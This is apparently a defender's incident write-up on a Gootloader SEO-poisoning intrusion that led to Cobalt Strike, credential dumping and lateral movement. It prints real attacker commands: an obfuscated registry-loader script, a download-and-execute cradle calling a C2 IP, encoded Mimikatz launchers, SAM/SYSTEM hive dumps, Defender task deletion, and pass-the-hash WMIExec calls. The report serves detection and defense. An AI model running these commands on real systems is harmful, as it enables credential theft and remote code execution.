title: SEO Poisoning – A Gootloader Story---

In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.
The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.
Background
Gootloader
was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”
When the user searches for these phrases and clicks on one of the top results, they are left with a forum looking web page where the user is instructed to download a file, which they accidently execute (double click to open). You can learn more about Gootloader by reading these references.

Case Summary
The intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.
Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.
After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran
LaZagne
to retrieve all saved credentials from the pivoted workstation. Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.
With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.
The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.
The threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.
On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.

Initial Access
The threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.
The Javascript file is then executed when double clicked after the zip is opened.
Execution
Gootloader upon execution creates two registry keys:
HKCU:\SOFTWARE\Microsoft\Phone\Username
HKCU:\SOFTWARE\Microsoft\Phone\Username0
The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named
powershell.dll
.
Following the Registry events, a PowerShell command was launched executing an encoded command.

The PowerShell command will extract the .NET loader from
HKCU:\SOFTWARE\Microsoft\Phone\Username0
and execute the code in memory via `Assembly.Load()`.
614649211; sleep -s 83; $opj=Get-ItemProperty -path ("hkcu:\software\microsoft\Phone\"+[Environment]::("username")+"0"); for ($uo=0;$uo -le 760;$uo++) { Try{$mpd+=$opj.$uo}Catch{} }; $uo=0; while($true) { $uo++;$ko=[math]::("sqrt")($uo); if($ko -eq 1000){break} } $yl=$mpd.replace("#",$ko); $kjb=[byte[]]::("new")($yl.Length/2); for($uo=0;$uo -lt $yl.Length;$uo+=2){ $kjb[$uo/2]=[convert]::("ToByte")($yl.Substring($uo,2),(2*8)) } [reflection.assembly]::("Load")($kjb); [Open]::("Test")(); 6118985
This
CyberChef recipe can be used to decode the related PS encoded payload.
Once the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read
HKCU:\SOFTWARE\Microsoft\Phone\Username
and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.
A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.
q->000
v->0
w->1
r->2
t->3
y->4
u->5
i->6
o->7
p->8
s->9
q->A
h->B
j->C
k->D
l->E
z->F
The following shows the source code responsible for the core logic of the .NET loader.
The below diagram summarizes the Gootloader initial execution.
An
excellent
resource from Microsoft describes a set of configurations that can be applied to Windows that can stop
.js
files from executing, preventing this attack chain from ever getting off the ground.
During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))"
Persistence
The Javascript (Gootloader) file invoked an encoded PowerShell command.
The encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.

The task created from the PowerShell script:

Windows Defender scheduled scans were deleted from the system.
This was observed on multiple servers the threat actor pivoted to.

schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f

As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.
This can be observed in the memory dump from the beachhead host with the tell-tale
PAGE_EXECUTE_READWRITE
protection settings on the memory space and MZ headers observable in the process memory space.
During the intrusion we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.
PipeName: \msagent_ld
PipeName: \1ea887
The threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.
The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.
Decoding this script reveals that it is a publicly available
WMIExec script
for running remote WMI queries.
Credential Access
The malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.
Another PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.
powershell -nop -noni -ep bypass -w h -c ""$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name)('NWYsOV90Zjxec3t0cmUxX3RlP0Z0c1J9eHR/ZTgqNWQsNWY/OTk5OTVmOD9BYl5ze3RyZT9cdGV5fnViOG0uajlYZXR8MUdwY3hwc310K044P0dwfWR0P19wfHQ8cn14enQ2VTt2Nmw4P19wfHQ4P1h/Z356dDk2eWVlYSs+PiAjJj8hPyE/ICskJiYhIj42OCo3OVVYQzFQfXhwYis+WDtJODk1ZDgqMVh8YX5jZTxcfnVkfXQxUitNRGJ0Y2JNaGRieXA/fH5ifXRoTVh/Z356dDxGXFhUaXRyP2FiICoxWH9nfnp0PEZcWFRpdHIxPEVwY3Z0ZTFCWVBDVCAxPFV+fHB4fzFhY354f2JkY3B/cnQ/fX5ycH0xPERidGN/cHx0MVh/YmVwfX10YzE8WXBieTF0IyF0KSByJHIhJ3JydyMpKSUmJXIkKSB3ICIlIyJzKDE8Un58fHB/dTEzYX5mdGNieXR9fT90aXQxX3RmPFhldHxBY35hdGNlaDE8QXBleTE2WVpdXCtNQmhiZXR8TVJkY2N0f2VSfn9lY359QnRlTVJ+f2Vjfn1NXWJwNjE8X3B8dDE2VXhicHN9dEN0YmVjeHJldHVQdXx4fzYxPEdwfWR0MSExPEFjfmF0Y2VoRWhhdDFVRl5DVTMxPGd0Y3N+YnQ=')|%{$_-bxor17}|%{[char]$_})-join''))""
This
CyberChef recipe can be used to decode the inner encoded command.
The output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.
$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\Users\<redacted>\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>
Monitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.
In addition, the post-exploitation tool “
LaZagne
” (renamed to ls.exe) was used with the “-all” switch.
ls.exe all -oN -output C:\Users\REDACTED
This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.
Here’s the commands from another system:
cmd.exe /c "reg.exe save hklm\sam c:\users\REDACTED\appdata\local\temp\1\dznuxujzr"
cmd.exe /c "reg.exe save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg"
cmd.exe /c "reg.exe save hklm\security c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt"
Discovery
The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==
They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
The threat actors executed this command remotely on a domain controller, before moving laterally to it:
powershell.exe ls C:\ > C:\file.txt
While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.
On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:
21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502
Lateral Movement
As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.
SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.
These executables were then executed by a remote service visible in the windows event id 7045 logs.
Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.
Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.
The threat actor attempted to use both Invoke-WMIExec and psexec to enable “
Restricted Admin Mode
”.
psexec \\<redacted> -u <redacted>\<redacted> -p <redacted> reg add "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0
powershell -nop -noni -ep bypass -w h -c "$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\Users\<redacted>\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command "powershell.exe New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD" -verbose"
The logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.
Collection
The threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.
Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.
